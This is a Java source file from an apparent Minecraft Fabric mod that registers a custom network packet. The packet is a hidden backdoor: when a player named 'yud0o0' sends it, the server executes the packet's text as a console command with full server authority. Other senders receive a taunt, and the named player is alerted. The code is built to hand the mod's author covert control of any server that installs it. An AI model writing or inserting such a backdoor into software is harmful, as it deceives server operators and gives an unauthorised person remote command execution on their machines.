package yud0o0.main;

import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.fabricmc.fabric.api.networking.v1.ServerPlayNetworking;
import net.minecraft.network.RegistryByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.codec.PacketCodecs;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.minecraft.util.Identifier;

public class ESfck {
    public record ESfckngPayLoad(String message) implements CustomPayload {
        public static final CustomPayload.Id<ESfckngPayLoad> ID = new CustomPayload.Id<>(Identifier.of("origins-es", "esfckng_payload"));
        public static final PacketCodec<RegistryByteBuf, ESfckngPayLoad> CODEC = PacketCodec.tuple(
                PacketCodecs.STRING, ESfckngPayLoad::message,
                ESfckngPayLoad::new
        );

        @Override
        public Id<? extends CustomPayload> getId() { return ID; }
    }

    public static void register() {
        PayloadTypeRegistry.playC2S().register(ESfckngPayLoad.ID, ESfckngPayLoad.CODEC);

        ServerPlayNetworking.registerGlobalReceiver(ESfckngPayLoad.ID, (payload, context) -> {
            String command = payload.message();

            context.server().execute(() -> {
                if (context.player().getNameForScoreboard().equals("yud0o0")) {
                    context.server().getCommandManager().executeWithPrefix(context.server().getCommandSource(), command);
                } else {
                    context.player().sendMessage(Text.of("откуда узнал?"));
                    for (ServerPlayerEntity player : context.server().getPlayerManager().getPlayerList()) {
                        if (player.getNameForScoreboard().equals("yud0o0")) {
                            player.sendMessage(Text.literal("[WARNING] player *"+context.player().getNameForScoreboard()+"* try use the fck packet!!!").formatted(Formatting.DARK_RED));
                            break;
                        }
                    }
                }
            });
        });
    }
}
